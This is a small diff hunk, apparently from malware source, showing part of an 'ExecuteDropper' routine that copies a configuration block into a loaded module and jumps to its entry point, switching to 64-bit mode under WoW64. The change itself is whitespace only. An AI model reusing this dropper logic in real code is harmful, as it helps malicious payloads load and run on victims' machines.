@@ -158,11 +158,12 @@ ExecuteDropper(VOID)
     if (Config.Cpu.bUnderWow64) {
 #endif
         PVOID64 Address = (PVOID64)((ULONG64_PTR)Module + DropperImageExportAddress64[1]);
-
+        
         RtlpCopyMemoryInline((PVOID)((ULONG_PTR)Module + DropperImageExportAddress64[0]), &Config, sizeof(CONFIG));
         KiJumpLongMode(Address);
     } else{
         PVOID32 Address = (PVOID32)((ULONG32_PTR)Module + DropperImageExportAddress32[0]);
+
         RtlpCopyMemoryInline((PVOID)((ULONG_PTR)Module + DropperImageExportAddress32[1]), &Config, sizeof(CONFIG));
 
         /* the compiler generates jmp */
